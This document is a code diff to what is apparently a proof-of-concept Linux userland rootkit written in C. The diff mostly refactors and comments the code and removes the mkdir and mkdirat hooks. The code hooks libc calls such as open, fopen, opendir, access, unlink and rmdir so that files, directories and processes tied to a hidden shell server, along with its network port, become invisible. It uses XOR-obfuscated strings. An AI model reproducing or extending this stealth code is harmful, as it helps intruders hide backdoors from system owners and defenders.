@@ -27,8 +27,6 @@
 
 // Set up syscall hooks
 void init(void) {
-    DEBUG("[rootkit-poc]: init called\n");
-
     if (is_loaded) {
         return;
     }
@@ -112,22 +110,20 @@ int is_invisible(const char *path) {
     xor(shell_server);
 
     // Checks if the path contains the MAGIC_STRING
-    if (strstr(path, MAGIC_STRING)
-        || strstr(path, shell_server)
-        || strstr(path, config_file)
-        || strstr(path, bin_file)) {
+    if ((strstr(path, MAGIC_STRING)) ||
+        (strstr(path, shell_server)) ||
+        (strstr(path, config_file)) ||
+        (strstr(path, bin_file))) {
         cleanup(config_file, strlen(config_file));
         cleanup(bin_file, strlen(bin_file));
         cleanup(shell_server, strlen(shell_server));
         return 1; // invisible
     }
 
-    struct stat s_fstat;
     char line[MAX_LEN];
     char p_path[PATH_MAX];
     char *proc_path = strdup(PROC_PATH);
     FILE *cmd;
-    int fd;
 
     xor(proc_path);
 
@@ -146,14 +142,13 @@ int is_invisible(const char *path) {
 
         if (cmd) {
             int res;
-            char *step = &line[0];
 
             while ((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                 if (strstr(line, shell_server)) {
                     cleanup(config_file, strlen(config_file));
                     cleanup(bin_file, strlen(bin_file));
                     cleanup(shell_server, strlen(shell_server));
-                    return 1;
+                    return 1; // invisible
                 }
 
                 memset(line, 0x00, MAX_LEN);
@@ -245,7 +240,7 @@ FILE *hide_ports(const char *filename) {
         cleanup(scanf_line, strlen(scanf_line));
 
         if ((rem_port == SHELL_SERVER_PORT) || (local_port == SHELL_SERVER_PORT)) {
-            continue;
+            continue; // hide port
         } else {
             fputs(line, tmp);
         }
@@ -282,7 +277,7 @@ int access(const char *path, int mode) {
         return -1;
     }
 
-    // Calls the original access function if the file is visible
+    // Calls the original access function if the path is visible
     return (long) syscall_list[SYS_ACCESS].syscall_func(path, mode);
 }
 
@@ -317,19 +312,21 @@ FILE *fopen(const char *filename, const char *mode) {
         return NULL;
     }
 
+    // Calls the original fopen function if the file is visible
     return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
 }
 
 // Hooked opendir function to hide invisible directories
-DIR *opendir(const char *name) {
+DIR *opendir(const char *pathname) {
     DEBUG("[rootkit-poc]: opendir hooked\n");
 
-    if (is_invisible(name)) {
+    if (is_invisible(pathname)) {
         errno = ENOENT;
         return NULL;
     }
 
-    return syscall_list[SYS_OPENDIR].syscall_func(name);
+    // Calls the original opendir function if the path is visible
+    return syscall_list[SYS_OPENDIR].syscall_func(pathname);
 }
 
 // Hooked open function to hide invisible files
@@ -341,31 +338,8 @@ int open(const char *pathname, int flags, mode_t mode) {
         return -1;
     }
 
+    // Calls the original open function if the path is visible
     return (long) syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);
-}
-
-// Hooked mkdir function to hide invisible directories
-int mkdir(const char *pathname, mode_t mode) {
-    DEBUG("[rootkit-poc]: mkdir hooked\n");
-
-    if (is_invisible(pathname)) {
-        errno = EACCES;
-        return -1;
-    }
-
-    return (long) syscall_list[SYS_MKDIR].syscall_func(pathname, mode);
-}
-
-// Hooked mkdirat function to hide invisible directories
-int mkdirat(int dirfd, const char *pathname, mode_t mode) {
-    DEBUG("[rootkit-poc]: mkdirat hooked\n");
-
-    if (is_invisible(pathname)) {
-        errno = EACCES;
-        return -1;
-    }
-
-    return (long) syscall_list[SYS_MKDIRAT].syscall_func(dirfd, pathname, mode);
 }
 
 // Hooked rmdir function to hide invisible directories
@@ -377,6 +351,7 @@ int rmdir(const char *pathname) {
         return -1;
     }
 
+    // Calls the original rmdir function if the path is visible
     return (long) syscall_list[SYS_RMDIR].syscall_func(pathname);
 }
 
@@ -389,6 +364,7 @@ int link(const char *oldpath, const char *newpath) {
         return -1;
     }
 
+    // Calls the original link function if the path is visible
     return (long) syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
 }
 
@@ -401,6 +377,7 @@ int unlink(const char *pathname) {
         return -1;
     }
 
+    // Calls the original unlink function if the path is visible
     return (long) syscall_list[SYS_UNLINK].syscall_func(pathname);
 }
 
@@ -413,6 +390,7 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
         return -1;
     }
 
+    // Calls the original unlinkat function if the path is visible
     return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
 }
 
